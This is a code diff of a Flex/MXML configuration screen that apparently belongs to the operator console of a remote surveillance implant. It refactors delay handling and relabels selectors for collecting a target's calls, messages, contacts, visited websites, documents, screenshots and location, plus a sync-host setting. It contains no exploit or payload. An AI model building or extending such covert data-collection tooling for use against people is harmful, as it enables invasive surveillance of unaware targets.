@@ -6,9 +6,7 @@
           xmlns:configuration="it.ht.rcs.console.operations.view.configuration.*"
           xmlns:basic="it.ht.rcs.console.operations.view.configuration.basic.*"
           xmlns:selectors="it.ht.rcs.console.operations.view.configuration.basic.selectors.*"
-          width="100%" height="100%" addedToStage="onAddedToStage(event)" horizontalAlign="center"
-          removedFromStage="onRemovedFromStage(event)">
-
+          width="100%" height="100%" horizontalAlign="center">
 
   <fx:Script>
     <![CDATA[
@@ -27,11 +25,14 @@
         position.selected   = hasAction('position');
         
         if (screenshot.selected)
-          screenshot.delay = getScreenshotDelay();
+          screenshot.minutes.text = String(getDelayFor('SCREENSHOT') / 60);
+        
+        if (position.selected)
+          position.minutes.text = String(getDelayFor('POSITION') / 60);
         
         sync.selected = hasSync();
         if (sync.selected)
-          sync.delay = getSyncDelay();
+          sync.minutes.text = String(getDelayFor('SYNC') / 60);
       }
       
       private function hasAction(name:String):Boolean
@@ -50,22 +51,12 @@
         return false;
       }
       
-      private function getScreenshotDelay():int
+      private function getDelayFor(desc:String):int
       {
         var event:Object;
         for each (var e:Object in config.events)
-        if (e.desc == 'SCREENSHOT')
-          event = e;
-        
-        return event == null ? 0 : event.delay as int;
-      }
-      
-      private function getSyncDelay():int
-      {
-        var event:Object;
-        for each (var e:Object in config.events)
-        if (e.desc == 'SYNC')
-          event = e;
+          if (e.desc == desc)
+            event = e;
         
         return event == null ? 0 : event.delay as int;
       }
@@ -78,20 +69,6 @@
           syncAction = a;
         
         return syncAction != null;
-      }
-      
-      private function onAddedToStage(event:Event):void
-      {
-        addEventListener('switch', moduleSwitch);
-      }
-      
-      private function onRemovedFromStage(event:Event):void
-      {
-        removeEventListener('switch', moduleSwitch);
-      }
-      
-      private function moduleSwitch(event:Event):void
-      {
       }
       
       private function goToAdvanced(event:MouseEvent):void
@@ -113,6 +90,11 @@
         model.screenshot = screenshot.selected;
         model.position   = position.selected;
         model.sync       = sync.selected;
+
+        model.screenshotDelay = Number(screenshot.minutes.text) * 60;
+        model.positionDelay = Number(position.minutes.text) * 60;
+        model.syncDelay = Number(sync.minutes.text) * 60;
+        model.syncHost = sync.host.selectedItem.address;
         
         config = BasicConfigBuilder.buildConfig(config.modules, config.globals, model);
         return config;
@@ -123,23 +105,23 @@
   <s:VGroup width="100%" maxWidth="1200" gap="20" paddingTop="20">
   
     <s:HGroup width="100%" gap="30">
-      <selectors:SimpleSelector id="call" text="Calls (Phone, Skype, MSN)"/>
-      <selectors:SimpleSelector id="calendar" text="Contacts &amp; Calendar"/>
+      <selectors:SimpleSelector id="call" title="Calls (Phone, Skype, MSN)"/>
+      <selectors:SimpleSelector id="calendar" title="Contacts &amp; Calendar"/>
     </s:HGroup>
     
     <s:HGroup width="100%" gap="30">
-      <selectors:SimpleSelector id="messages" text="Messages (Mail, SMS, Chat)"/>
-      <selectors:SimpleSelector id="url" text="Visited Websites"/>
+      <selectors:SimpleSelector id="messages" title="Messages (Mail, SMS, Chat)"/>
+      <selectors:SimpleSelector id="url" title="Visited Websites"/>
     </s:HGroup>
     
     <s:HGroup width="100%" gap="30">
-      <selectors:SimpleSelector id="file" text="Documents"/>
-      <selectors:ScreenshotSelector id="screenshot" text="Screenshots &amp; Mouse"/>
+      <selectors:SimpleSelector id="file" title="Documents"/>
+      <selectors:ScreenshotSelector id="screenshot" title="Screenshots &amp; Mouse"/>
     </s:HGroup>
     
     <s:HGroup width="100%" gap="30">
-      <selectors:LocationSelector id="position" text="Location"/>
-      <selectors:SyncSelector id="sync"/>
+      <selectors:PositionSelector id="position" title="Location"/>
+      <selectors:SyncSelector id="sync" title="Online Synchronization"/>
     </s:HGroup>
     
     <s:HGroup width="100%" gap="0" horizontalAlign="right">
